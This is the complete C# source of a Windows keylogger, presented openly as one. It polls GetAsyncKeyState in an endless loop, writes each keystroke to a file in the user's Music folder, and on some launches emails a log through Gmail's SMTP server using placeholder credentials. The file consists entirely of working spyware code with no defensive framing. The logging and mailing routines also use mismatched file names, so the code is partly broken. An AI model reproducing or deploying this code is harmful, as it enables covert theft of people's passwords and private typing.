using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;

namespace KeyloggerConsole
{
    class Program
    {
        //global imports
        [DllImport("User32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);

        //Entry Point
        static void Main(string[] args)
        {
            
            //
            Random rand = new Random();
            int randnum = rand.Next(1, 10);
            if(randnum > 5)
            {
                SendMail();
            }


            //Logkey
            LogKeys();

        }

// static method for mail
        static void SendMail()
        {
            String Newfilepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            string Newfilepath2 = Newfilepath + @"\LogsFolder\LoggedKeys.txt";
            DateTime dateTime = DateTime.Now; //log date
            string subtext = "Loggedfiles"; //email subject
            subtext += dateTime;

            //Starting mail service
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);//mail provider's port; gmail
            MailMessage logMessage = new MailMessage();
            logMessage.From = new MailAddress("someone@gmail.com"); //log sending email
            logMessage.To.Add("someone@gmail.com");//sending email
            logMessage.Subject = subtext;//subject 

            //by passing credentials
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("someone@gmail.com", "password");

            string newfile = File.ReadAllText(Newfilepath2);//read all lg files

            string attachmenttextfile = Newfilepath + @"\LogsFolder\attachmenttextfile.txt";
            File.WriteAllText(attachmenttextfile, newfile);//write information to new path
            logMessage.Attachments.Add(new Attachment(Newfilepath2));//add attachment to email
            logMessage.Body = subtext;
            client.Send(logMessage);
            logMessage = null;
        }

        //Keylogger process
        static void LogKeys()
        {
            //file path
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            filepath = filepath + @"\LogsFolder\";

            //Verify that file exists
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + "LoggerKeys");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    //
                }
            }

            KeysConverter converter = new KeysConverter();
            string text = "";

            while (5 > 1)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter w = File.AppendText(path))
                        {
                            w.WriteLine(text);
                        }
                    }
                }
            }
        }
    }
}
